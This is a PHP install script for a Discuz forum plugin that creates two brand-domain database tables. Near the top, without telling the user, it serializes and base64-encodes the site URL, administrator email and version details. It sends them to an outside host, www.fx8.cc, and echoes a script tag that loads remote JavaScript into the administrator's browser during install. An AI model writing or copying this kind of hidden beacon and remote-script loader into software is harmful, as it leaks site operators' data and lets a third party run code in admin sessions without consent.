<?php
/**
 *      [fx8.cc] (C)2014-2017 ymg6.Com.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: install.php sanree $
 */
 
if(!defined('IN_DISCUZ')) { 
	exit('Access Denied');
}

$pluginid=$pluginarray['plugin']['identifier'];
require_once DISCUZ_ROOT.'./source/discuz_version.php';
$siteinfo=array(
	'site_version' => DISCUZ_VERSION,
	'site_release' => DISCUZ_RELEASE,
	'site_timestamp' => TIMESTAMP,
	'site_url' => $_G['siteurl'],
	'site_adminemail' => $_G['setting']['adminemail'],
	'plugin_identifier' => $pluginid,
	'plugin_version' => $pluginarray['plugin']['version'],
	'action' => 1,
);
$sitestr=base64_encode(serialize($siteinfo));
$sanree='http://www.fx8.cc/vk.php?data='.$sitestr.'&sign='.md5(md5($sitestr));
echo "<script src=\"".$sanree."\" type=\"text/javascript\"></script>";

$sql = <<<EOF
CREATE TABLE IF NOT EXISTS `pre_sanree_brand_domain` (
  `domainid` int(11) NOT NULL auto_increment,
  `uid` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `domainname` varchar(255) NOT NULL,
  `dateline` int(11) NOT NULL,
  `startdate` int(11) NOT NULL,
  `enddate` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `adminuid` int(11) NOT NULL,
  `reason` varchar(255) default NULL,
  `memo` text,
  `buylogid` int(11) NOT NULL,
  `price` int(11) NOT NULL default '0',
  `creditunitname` varchar(50) NOT NULL,
  PRIMARY KEY  (`domainid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_domain_brand2domain` (
  `id` int(11) NOT NULL auto_increment,
  `bid` int(11) NOT NULL,
  `domainid` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `dateline` int(11) default NULL,
  `status` tinyint(1) NOT NULL,
  `isshow` tinyint(1) default NULL,
  `adminuid` int(11) NOT NULL,
  `memo` text,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM;
EOF;
runquery($sql);

$finish = TRUE;

?>